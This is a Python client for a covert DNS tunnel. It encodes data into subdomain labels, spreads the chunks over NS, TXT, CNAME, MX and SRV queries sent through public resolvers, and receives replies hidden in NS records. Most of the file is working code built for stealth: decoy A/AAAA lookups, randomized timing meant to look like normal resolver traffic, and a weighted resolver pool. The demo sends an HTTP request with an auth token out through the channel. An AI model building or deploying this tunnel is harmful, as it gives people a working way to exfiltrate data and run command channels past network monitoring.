#!/usr/bin/env python3
"""
DNS tunnel — client

Architecture
────────────
• NS records carry the primary/vital payload (session header + data chunks).
  TXT, CNAME, MX, SRV carry supporting shards so every burst looks like a
  normal multi-record dnstt-style query set.
• Payload is 32-bit XOR encoded + Base32 → DNS-safe labels.
• Queries mimic real recursive-resolver traffic:
    - Each label is a realistic subdomain of the tunnel domain
    - Chunk queries are interleaved with decoy A/AAAA lookups
    - Per-query send delay: uniform random 20–120 ms  (configurable)
    - Per-burst inter-arrival: Gaussian around real NTP/DNS poll intervals
• Resolver pool: up to 100 resolvers, round-robin + weighted failure penalty.
• Transport: UDP/53 (preferred, ≤512 B) with automatic TCP/53 fallback for
  responses that have TC=1 or for queries >512 bytes.
• Receive path: server embeds reply in NS RDATA of a reply-<sid> query;
  client polls and 32-bit decodes the response.
"""

import os, sys, time, random, struct, socket, threading, secrets, hashlib, base64
from dataclasses     import dataclass, field
from typing          import Dict, List, Optional, Tuple
from tunnel_core     import (
    derive_key_stream, encode_payload, decode_labels,
    b32enc, b32dec, frame, deframe, NTP_COVERT_BYTES,
)

# ─── tuneable ───────────────────────────────────────────────────────────────
TUNNEL_DOMAIN      = "t.example.com"          # zone you control
DEFAULT_RESOLVERS  = [                         # seed list — add up to 100
    ("127.0.0.1",  53),
    ("8.8.8.8",    53),
    ("1.1.1.1",    53),
]
SEND_DELAY_MS_MIN  =  20    # ms between individual query sends
SEND_DELAY_MS_MAX  = 120    # ms — uniform random in this range
RECV_POLL_DELAY_MS =  80    # ms between reply poll attempts
RECV_MAX_POLLS     =  40    # give up after this many polls
DECOY_RATIO        = 0.30   # fraction of extra decoy A/AAAA queries per burst
UDP_MAX_PAYLOAD    = 512    # bytes — exceed this → switch to TCP
JITTER_MEAN_S      = 1.2    # seconds mean inter-burst delay (Gaussian)
JITTER_STD_S       = 0.4
SESSION_TIMEOUT_S  = 30.0


# ─── record types ───────────────────────────────────────────────────────────
class RType:
    NS    = 2    # ← VITAL: session header + primary chunk data lives here
    CNAME = 5
    MX    = 15
    TXT   = 16
    SRV   = 33
    A     = 1
    AAAA  = 28

    # ordered by priority — NS first so vital data always goes first
    COVERT  = [NS, TXT, CNAME, MX, SRV]
    DECOY   = [A, AAAA]
    NAMES   = {2:"NS",5:"CNAME",15:"MX",16:"TXT",33:"SRV",1:"A",28:"AAAA"}


# ─── resolver pool ──────────────────────────────────────────────────────────

@dataclass
class Resolver:
    host:     str
    port:     int   = 53
    failures: int   = 0
    last_ok:  float = field(default_factory=time.time)

    @property
    def weight(self) -> float:
        """Higher failures → lower weight → used less."""
        return max(0.05, 1.0 / (1 + self.failures))

    def mark_ok(self):
        self.failures = max(0, self.failures - 1)
        self.last_ok  = time.time()

    def mark_fail(self):
        self.failures = min(self.failures + 1, 10)


class ResolverPool:
    """Thread-safe weighted pool of up to 100 DNS resolvers."""

    def __init__(self, resolvers: List[Tuple[str, int]]):
        self._lock  = threading.Lock()
        self._pool  = [Resolver(h, p) for h, p in resolvers[:100]]

    def add(self, host: str, port: int = 53):
        with self._lock:
            if len(self._pool) < 100:
                self._pool.append(Resolver(host, port))

    def pick(self) -> Resolver:
        """Weighted-random selection."""
        with self._lock:
            pool    = self._pool
            weights = [r.weight for r in pool]
            total   = sum(weights)
            r_val   = random.uniform(0, total)
            cumul   = 0.0
            for res, w in zip(pool, weights):
                cumul += w
                if r_val <= cumul:
                    return res
            return pool[-1]

    def __len__(self):
        with self._lock:
            return len(self._pool)


# ─── DNS wire format ─────────────────────────────────────────────────────────

def _encode_name(name: str) -> bytes:
    out = b""
    for part in name.rstrip(".").split("."):
        enc = part.encode()
        out += bytes([len(enc)]) + enc
    return out + b"\x00"

def build_query(qname: str, qtype: int, txid: int) -> bytes:
    """Build a standard DNS query packet."""
    hdr = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0)
    q   = _encode_name(qname) + struct.pack("!HH", qtype, 1)
    return hdr + q

def parse_qname(data: bytes, offset: int) -> Tuple[str, int]:
    parts, visited = [], set()
    while offset < len(data):
        if offset in visited:
            break
        visited.add(offset)
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if (length & 0xC0) == 0xC0:
            ptr = ((length & 0x3F) << 8) | data[offset + 1]
            sub, _ = parse_qname(data, ptr)
            parts.append(sub)
            offset += 2
            break
        offset += 1
        parts.append(data[offset : offset + length].decode(errors="replace"))
        offset += length
    return ".".join(parts), offset

def parse_question(data: bytes) -> Optional[Tuple[str, int, int]]:
    try:
        qname, off = parse_qname(data, 12)
        qtype, qclass = struct.unpack_from("!HH", data, off)
        return qname, qtype, qclass
    except Exception:
        return None

def build_nxdomain(txid: int) -> bytes:
    return struct.pack("!HHHHHH", txid, 0x8183, 0, 0, 0, 0)

def parse_txid(data: bytes) -> int:
    return struct.unpack_from("!H", data, 0)[0] if len(data) >= 2 else 0

def is_tc(data: bytes) -> bool:
    """Return True if the TC (truncated) flag is set in a DNS response."""
    if len(data) < 4:
        return False
    flags = struct.unpack_from("!H", data, 2)[0]
    return bool(flags & 0x0200)

def extract_ns_rdata(response: bytes) -> List[str]:
    """
    Extract all NS RDATA (nameserver names) from a DNS response answer section.
    We store covert data as the nameserver hostname label.
    """
    results = []
    try:
        if len(response) < 12:
            return results
        ancount = struct.unpack_from("!H", response, 6)[0]
        offset  = 12
        # skip question
        _, offset = parse_qname(response, offset)
        offset += 4   # QTYPE + QCLASS
        for _ in range(ancount):
            _, offset = parse_qname(response, offset)
            rtype, _, _, rdlen = struct.unpack_from("!HHIH", response, offset)
            offset += 10
            if rtype == RType.NS:
                ns_name, _ = parse_qname(response, offset)
                results.append(ns_name)
            offset += rdlen
    except Exception:
        pass
    return results

def extract_txt_rdata(response: bytes) -> List[bytes]:
    """Extract TXT RDATA strings from DNS response."""
    results = []
    try:
        if len(response) < 12:
            return results
        ancount = struct.unpack_from("!H", response, 6)[0]
        offset  = 12
        _, offset = parse_qname(response, offset)
        offset += 4
        for _ in range(ancount):
            _, offset = parse_qname(response, offset)
            rtype, _, _, rdlen = struct.unpack_from("!HHIH", response, offset)
            offset += 10
            if rtype == RType.TXT and rdlen > 1:
                str_len = response[offset]
                results.append(response[offset + 1 : offset + 1 + str_len])
            offset += rdlen
    except Exception:
        pass
    return results


# ─── transport: UDP with TCP fallback ────────────────────────────────────────

def _send_udp(pkt: bytes, resolver: Resolver, timeout: float = 2.0) -> Optional[bytes]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(pkt, (resolver.host, resolver.port))
        resp, _ = s.recvfrom(4096)
        s.close()
        return resp
    except Exception:
        return None

def _send_tcp(pkt: bytes, resolver: Resolver, timeout: float = 4.0) -> Optional[bytes]:
    """DNS over TCP/53 — 2-byte length prefix per RFC 1035 §4.2.2."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((resolver.host, resolver.port))
        framed = struct.pack("!H", len(pkt)) + pkt
        s.sendall(framed)
        # read response length
        raw_len = s.recv(2)
        if len(raw_len) < 2:
            s.close()
            return None
        resp_len = struct.unpack("!H", raw_len)[0]
        resp = b""
        while len(resp) < resp_len:
            chunk = s.recv(resp_len - len(resp))
            if not chunk:
                break
            resp += chunk
        s.close()
        return resp if len(resp) == resp_len else None
    except Exception:
        return None

def send_query(
    qname: str,
    qtype: int,
    pool: ResolverPool,
    force_tcp: bool = False,
) -> Optional[bytes]:
    """
    Send one DNS query, automatically falling back to TCP if:
      - force_tcp=True, or
      - the packet exceeds UDP_MAX_PAYLOAD bytes, or
      - the UDP response has TC=1 (truncation).
    Applies per-query send delay of SEND_DELAY_MS_MIN…MAX ms.
    """
    txid = random.randint(1, 0xFFFF)
    pkt  = build_query(qname, qtype, txid)
    res  = pool.pick()

    # mandatory ms-range jitter before every send
    delay_ms = random.uniform(SEND_DELAY_MS_MIN, SEND_DELAY_MS_MAX)
    time.sleep(delay_ms / 1000.0)

    use_tcp = force_tcp or len(pkt) > UDP_MAX_PAYLOAD

    if not use_tcp:
        resp = _send_udp(pkt, res)
        if resp is None:
            res.mark_fail()
            # retry once on a different resolver
            res2 = pool.pick()
            resp = _send_udp(pkt, res2)
            if resp:
                res2.mark_ok()
        elif is_tc(resp):
            use_tcp = True   # server says it was truncated → retry via TCP

    if use_tcp:
        resp = _send_tcp(pkt, res)
        if resp is None:
            res.mark_fail()
            res2 = pool.pick()
            resp = _send_tcp(pkt, res2)
            if resp:
                res2.mark_ok()

    if resp is not None:
        res.mark_ok()
    else:
        res.mark_fail()

    return resp


# ─── session ─────────────────────────────────────────────────────────────────

@dataclass
class TunnelSession:
    session_id:   bytes = field(default_factory=lambda: secrets.token_bytes(6))
    key_stream:   bytes = field(init=False)
    block_offset: int   = 0         # advances across bursts so key never repeats

    def __post_init__(self):
        self.key_stream = derive_key_stream(self.session_id, 8192)

    @property
    def sid_hex(self) -> str:
        return self.session_id.hex()


# ─── query name builder ───────────────────────────────────────────────────────

# Real-world subdomain components that blend with normal traffic
_WORDS1 = ["api","cdn","img","www","mail","ns","relay","edge","metrics","auth",
           "v1","v2","data","sync","push","pull","files","dl","up","assets"]
_WORDS2 = ["prod","staging","us","eu","asia","global","internal","external",
           "primary","secondary","cache","store","live","static","media"]

def _decoy_qname() -> str:
    """Generate a realistic-looking decoy subdomain."""
    parts = [
        random.choice(_WORDS1),
        secrets.token_hex(2),
        random.choice(_WORDS2),
    ]
    random.shuffle(parts)
    return f"{'-'.join(parts[:2])}.{TUNNEL_DOMAIN}"

def _covert_qname(sid_hex: str, seq: int, total: int, label: str, rtype: int) -> str:
    """
    Build a covert query name that looks like a real subdomain:
      <label>-<sid4>-<seq3>.<tunnel_domain>
    where label is the Base32-encoded data chunk.

    The full session header (sid, total, rtype hint) is carried inside the NS
    RDATA on the server side — so the query name itself looks like any other
    subdomain lookup.

    Label structure keeps every component ≤63 chars (DNS label limit).
    """
    # encode seq and total compactly in the label prefix
    meta  = f"{sid_hex[:8]}{seq:03x}{total:03x}"
    chunk = label[:40]                         # cap data portion
    qname = f"{chunk}-{meta}.{TUNNEL_DOMAIN}"
    # ensure first label ≤63 chars
    first, rest = qname.split(".", 1)
    if len(first) > 63:
        first = first[:63]
    return f"{first}.{rest}"


# ─── NS reply builder (client-side) ──────────────────────────────────────────

def build_ns_query(qname: str, txid: int) -> bytes:
    """Build an NS query — this is what clients send to get vital reply data."""
    return build_query(qname, RType.NS, txid)


# ─── SEND: data → DNS burst ──────────────────────────────────────────────────

def send_payload(
    data: bytes,
    pool: ResolverPool,
    session: Optional[TunnelSession] = None,
) -> TunnelSession:
    """
    Encode `data` and transmit as a DNS burst.

    NS queries carry the vital chunks (session header + primary data).
    TXT/CNAME/MX/SRV queries carry supporting shards.
    Decoy A/AAAA queries are interleaved to mimic normal resolver traffic.

    Returns the session (for use in receive_reply).
    """
    if session is None:
        session = TunnelSession()

    # 32-bit encode for TX
    labels = encode_payload(data, session.key_stream, session.block_offset)
    n      = len(labels)
    session.block_offset += n

    sid    = session.sid_hex
    total  = n
    print(f"[DNS] TX sid={sid} total={total} labels block_off={session.block_offset - n}")

    # Assign labels to record types.
    # NS gets the FIRST (and most) labels — vital data priority.
    # Remaining labels round-robin across the other 4 types.
    ns_count   = max(1, (n * 3) // 5)         # ~60% to NS
    other_types = [RType.TXT, RType.CNAME, RType.MX, RType.SRV]

    covert_queries: List[Tuple[str, int]] = []
    for seq, lbl in enumerate(labels):
        if seq < ns_count:
            rtype = RType.NS
        else:
            rtype = other_types[(seq - ns_count) % len(other_types)]
        qname = _covert_qname(sid, seq, total, lbl, rtype)
        covert_queries.append((qname, rtype))

    # Decoy queries (A/AAAA) — blend with real traffic
    n_decoys = max(2, int(n * DECOY_RATIO))
    decoys   = [(_decoy_qname(), random.choice(RType.DECOY)) for _ in range(n_decoys)]

    # Interleave: covert + decoys, then shuffle (but keep first NS query first
    # so the server can establish the session before shards arrive)
    first_ns  = covert_queries[:1]
    rest_q    = covert_queries[1:] + decoys
    random.shuffle(rest_q)
    all_q     = first_ns + rest_q

    for qname, qtype in all_q:
        send_query(qname, qtype, pool)
        # inter-query jitter already applied inside send_query

    return session


# ─── RECEIVE: poll for reply ─────────────────────────────────────────────────

def receive_reply(
    session: TunnelSession,
    pool: ResolverPool,
    expected_labels: int = 0,
) -> Optional[bytes]:
    """
    Poll the server for a reply by querying the NS record of a magic name:
      reply-<sid_hex>.<tunnel_domain>

    The server embeds reply chunks as NS RDATA (nameserver hostnames that
    are actually Base32-encoded payload labels + metadata).

    Returns decoded reply bytes or None if no reply within RECV_MAX_POLLS polls.
    """
    reply_qname = f"reply-{session.sid_hex}.{TUNNEL_DOMAIN}"
    collected: Dict[int, str] = {}
    total_expected: Optional[int] = expected_labels or None

    for attempt in range(RECV_MAX_POLLS):
        # ms-range delay between polls
        time.sleep(RECV_POLL_DELAY_MS / 1000.0)

        resp = send_query(reply_qname, RType.NS, pool)
        if resp is None:
            continue

        ns_names = extract_ns_rdata(resp)
        for ns_name in ns_names:
            # NS RDATA format from server:
            #   <b32label>-<seq3hex><total3hex>.<tunnel_domain>
            try:
                first_label = ns_name.split(".")[0]
                parts = first_label.rsplit("-", 1)
                if len(parts) != 2 or len(parts[1]) != 6:
                    continue
                lbl    = parts[0]
                meta   = parts[1]
                seq    = int(meta[:3], 16)
                total  = int(meta[3:], 16)
                total_expected = total
                collected[seq] = lbl
            except Exception:
                continue

        if total_expected and len(collected) >= total_expected:
            break

    if not collected:
        return None

    ordered = [collected[k] for k in sorted(collected.keys())]
    return decode_labels(ordered, session.key_stream, session.block_offset)


# ─── demo / entry point ──────────────────────────────────────────────────────

if __name__ == "__main__":
    pool = ResolverPool(DEFAULT_RESOLVERS)
    print(f"[DNS] Resolver pool: {len(pool)} resolvers")

    # Add extra resolvers to demonstrate pool expansion
    extras = [
        ("9.9.9.9",   53),
        ("8.8.4.4",   53),
        ("1.0.0.1",   53),
        ("208.67.222.222", 53),
    ]
    for h, p in extras:
        pool.add(h, p)
    print(f"[DNS] Pool after additions: {len(pool)} resolvers")

    data = b"GET /secret HTTP/1.1\r\nHost: internal.lan\r\nX-Auth: token123\r\n\r\n"
    sess = TunnelSession()
    print(f"\n[DNS] Sending {len(data)} bytes — session {sess.sid_hex}")

    sess = send_payload(data, pool, sess)
    print(f"[DNS] TX burst complete, block_offset={sess.block_offset}")

    print("[DNS] Polling for reply...")
    reply = receive_reply(sess, pool)
    if reply:
        print(f"[DNS] RX reply: {len(reply)} bytes — {reply[:80]!r}")
    else:
        print("[DNS] No reply (server not running — expected in standalone demo)")
